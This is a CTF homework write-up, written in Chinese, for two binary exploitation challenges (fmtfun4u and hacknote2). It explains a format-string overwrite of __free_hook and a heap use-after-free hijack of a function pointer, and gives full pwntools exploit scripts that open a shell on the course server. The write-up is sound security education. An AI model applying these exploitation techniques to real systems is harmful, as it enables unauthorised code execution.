hw4
===

## fmtfun4u

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled
```

### concept

先藉由 stack 上的值 leak 出 __libc_start_main+241 位置，接著可以推算出 libc 的 base address

![](https://i.imgur.com/35Sx9kz.png)

因為 for loop 中可以做 format string 的次數不多，所以我們先將 i 的值改大一點，方便之後可以多做幾次 format string

使用 argv chain 來修改 i 的值，注意 argv[0] 的 offset 不固定，所以用 argv 的位置計算 offset

i 的 address 在 rbp - 4 大小為 1 byte

![](https://i.imgur.com/LW6ueah.png)

利用 stack 上 0040 的位置作為 format string 的參數將 0x7fffffffe5d8 的值改為 i 的 address，接著再利用 0248 的位置再修改 i 的值

![](https://i.imgur.com/KYC5RbR.jpg)

如此即可達成可以多次 format string 的目的

原本是想要寫 rop chain 然後在 vfprintf ret 的時候跳過去

不過參考大大筆記後，發現一個更快的做法是將 ```__free_hook``` 改成 one gadget，接著 print 65537 個字元觸發 ```free``` 即可獲得 shell

https://github.com/Naetw/CTF-pwn-tips#hijack-hook-function

https://github.com/david942j/one_gadget

### exploit

```python
#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10136)
#r = process('./fmtfun4u')
context.arch = 'amd64'

def fmt(pre, val, idx, byte):
    if pre < val:
        res = '%{}c'.format(val - pre)
    elif pre == val:
        res = ''
    else:
        res = '%{}c'.format(val - pre + 256 ** byte)
    form = {1: 'hhn', 2: 'hn', 4: 'n'}
    res += '%{}${}'.format(idx, form[byte])
    return res

def crack(payload):
    # log.info('payload length: {}'.format(len(payload)))
    r.sendafter(':', payload)
    return r.recvline()[:-1]

def write_any(argv, target, val):
    crack(fmt(0, argv & 0xffff, 25, 2))
    crack(fmt(0, target & 0xffff, 39, 2))
    crack(fmt(0, (argv + 2) & 0xffff, 25, 2))
    crack(fmt(0, (target >> 16) & 0xffff, 39, 2))
    crack(fmt(0, (argv + 4) & 0xffff, 25, 2))
    crack(fmt(0, (target >> 32) & 0xffff, 39, 2))
    crack(fmt(0, val, 37, 2))

# raw_input('#')

libc = crack('%9$p')
libc = int(libc, 16) - 240 - 0x20740
log.info('address of libc base: {}'.format(hex(libc)))
free_hook = libc + 0x3c67a8
log.info('address of free_hook: {}'.format(hex(free_hook)))
argv = crack('%11$p')
log.info('address of argv: {}'.format(argv))
argv = int(argv, 16)
i_addr = argv - 236
log.info('address of i: {}'.format(hex(i_addr)))
crack(fmt(0, i_addr & 0xffff, 11, 2))
crack(fmt(0, 255, 37, 1))

magic_gadget = libc + 0xf0274

write_any(argv, free_hook, magic_gadget & 0xffff)
write_any(argv, free_hook + 2, (magic_gadget >> 16) & 0xffff)
write_any(argv, free_hook + 4, (magic_gadget >> 32) & 0xffff)

r.sendafter(':', "%65537c")

r.interactive()
```

### flag

```FLAG{FEED_MY_TURTLE}```

## hacknote2

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### concept

首先 malloc 兩塊比 note struct size 還大的 content 接著把他們 free 掉

之後 malloc 一塊 content 大小為 note struct size 的 memory 根據 fast bin 他的 content 會拿到之前 free 掉的 chunk，存在 **use after free** 的漏洞

將 (*printnote)() 填入 print_note_content 的 address 改掉 *content 為 atoi 的 got 接著 call print_note 即可藉此 address 算出 libc base address

再來 malloc 一塊比剛剛兩個都大的 memory 接著 free 掉，再 malloc note struct size 就可以直接蓋掉先前的 note 並直接把 (*printnote)() 改為 one gadget 接著 call print_note 就可以獲得 shell

### exploit

```python
#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10139)
# r = process('./hacknote2')

def add_note(sz, data):
    r.sendafter(':', '1')
    r.sendafter(':', str(sz))
    r.sendafter(':', str(data))

def del_note(idx):
    r.sendafter(':', '2')
    r.sendafter(':', str(idx))

def print_note(idx):
    r.sendafter(':', '3')
    r.sendafter(':', str(idx) + '\n')

#raw_input('#')

print_addr = 0x400886
atoi_got = 0x602068

add_note(40, 'lala')
add_note(40, 'gaga')
del_note(0)
del_note(1)
add_note(16, p64(print_addr) + p64(atoi_got))
print_note(0)
libc = u64(r.recvline()[:-1].ljust(8, '\x00')) - 0x36e80
log.info('libc base address: {}'.format(hex(libc)))
del_note(2)

add_note(80, 'aaaa')
del_note(3)
add_note(16, p64(libc + 0xf1117))
print_note(0)

r.interactive()
```

### flag

```FLAG{DEATHNOTE!!!!}```
